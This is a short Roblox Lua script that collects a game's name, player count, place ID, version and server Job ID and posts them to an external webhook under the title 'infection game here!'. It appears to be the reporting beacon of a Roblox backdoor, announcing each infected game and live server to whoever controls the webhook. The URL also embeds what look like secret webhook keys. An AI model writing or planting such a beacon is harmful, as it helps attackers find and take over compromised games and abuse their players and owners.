local webhook = "https://api-sidemod.sidetechrblx.com/v3/webhooks/1254229768728084603/sk_ctgDy9C6Imct2XNOrAMqrmjCbrwHTPJ3bcf9QuTsIXXJzTXRi_Aghyg1rd0ZLYnkq?authorization=rEX7R8W3DqxRT409LLQh"
local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local http = game:GetService("HttpService")
local players = game.Players:GetPlayers()
local maxplayers = game.Players.MaxPlayers

local function getTime()
	local date = os.date("*t")
	return ("%02d:%02d"):format(((date.hour % 24) - 1) % 12 + 1, date.min)
end

local data = {
	["embeds"] = {{
		["title"] = "infection game here!",
		["url"] = "https://roblox.com/games/" .. game.PlaceId,
		["description"] = "**Game Name:** ".. name.Name.."\n**Players:** ".. #players.."/"..maxplayers.."\n**Game Id:** ".. game.PlaceId.."\n**Game Version:** ".. game.PlaceVersion.."\n**Job Id:** "..game.JobId,
		["image"] = {
			["url"] = "https://t2.rbxcdn.com/0d499b55a8bc928003c91e739d829038"..game.PlaceId.."&width=768&height=432&format=png"
		},
		["footer"] = {
			["icon_url"] = "", 
		},
		["color"] = 5814783,

	}}
}

--if not game:GetService("RunService"):IsStudio() then 
local encode = http:JSONEncode(data) 
http:PostAsync(webhook,encode)
--end -- it will not run in studio only in game
